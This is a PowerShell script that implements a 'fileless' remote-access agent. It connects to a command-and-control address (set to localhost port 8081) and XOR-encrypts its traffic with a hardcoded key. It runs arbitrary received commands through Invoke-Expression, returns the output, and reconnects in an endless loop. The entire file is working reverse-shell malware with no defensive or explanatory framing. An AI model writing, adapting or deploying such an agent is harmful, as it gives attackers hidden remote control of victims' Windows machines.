$c2_ip = "127.0.0.1"
$c2_port = 8081
$CRYPTO_KEY = [System.Text.Encoding]::ASCII.GetBytes("D33pH4t_S3cr3t")

function Crypt-Data {
    param([byte[]]$Data)
    $out = New-Object byte[] $Data.Length
    $keyLen = $CRYPTO_KEY.Length
    for ($i = 0; $i -lt $Data.Length; $i++) {
        $out[$i] = $Data[$i] -bxor $CRYPTO_KEY[$i % $keyLen]
    }
    return $out
}

while ($true) {
    $client = $null
    $stream = $null
    try {
        $client = New-Object System.Net.Sockets.TcpClient($c2_ip, $c2_port)
        $stream = $client.GetStream()

        while ($client.Connected) {
            $header = New-Object byte[] 4
            $headerRead = 0
            while ($headerRead -lt 4) {
                $n = $stream.Read($header, $headerRead, 4 - $headerRead)
                if ($n -eq 0) { break }
                $headerRead += $n
            }
            if ($headerRead -lt 4) { break }

            if ([BitConverter]::IsLittleEndian) { [Array]::Reverse($header) }
            $payload_size = [BitConverter]::ToInt32($header, 0)
            if ($payload_size -le 0 -or $payload_size -gt 1048576) { break }

            $buffer = New-Object byte[] $payload_size
            $total_read = 0
            while ($total_read -lt $payload_size) {
                $read = $stream.Read($buffer, $total_read, $payload_size - $total_read)
                if ($read -eq 0) { break }
                $total_read += $read
            }
            if ($total_read -lt $payload_size) { break }

            $plain = Crypt-Data $buffer
            $request_str = [System.Text.Encoding]::UTF8.GetString($plain)
            $request = ConvertFrom-Json $request_str

            $method = $request.method
            $params = $request.params
            $response_data = ""

            if ($method -eq "exec") {
                $cmd = $params.c
                if ($cmd -eq "pwd") {
                    $response_data = (Get-Location).Path
                } elseif ($cmd -eq "ls") {
                    $response_data = (Get-ChildItem | Out-String)
                } elseif ($cmd.StartsWith("cd ")) {
                    $target = $cmd.Substring(3).Trim().Trim('"')
                    try {
                        Set-Location $target
                        $response_data = "Diretorio alterado para: $((Get-Location).Path)"
                    } catch {
                        $response_data = "Erro ao acessar diretorio: $_"
                    }
                } else {
                    $response_data = (Invoke-Expression $cmd | Out-String)
                }
            } elseif ($method -eq "get_system_info") {
                $response_data = "OS: Windows (Fileless PowerShell Agent v1.0)"
            } else {
                Write-Output $method
                $response_data = "Metodo nao implementado na memoria."
            }

            $response_obj = @{ status = "success"; data = $response_data }
            $response_json = ConvertTo-Json $response_obj -Compress
            $plain_bytes = [System.Text.Encoding]::UTF8.GetBytes($response_json)
            $encrypted = Crypt-Data $plain_bytes

            $size_bytes = [BitConverter]::GetBytes($encrypted.Length)
            if ([BitConverter]::IsLittleEndian) { [Array]::Reverse($size_bytes) }

            $stream.Write($size_bytes, 0, 4)
            $stream.Write($encrypted, 0, $encrypted.Length)
            $stream.Flush()
        }
    } catch {
    } finally {
        if ($stream) { try { $stream.Close() } catch {} }
        if ($client) { try { $client.Close() } catch {} }
    }
    Start-Sleep -Seconds 5
}
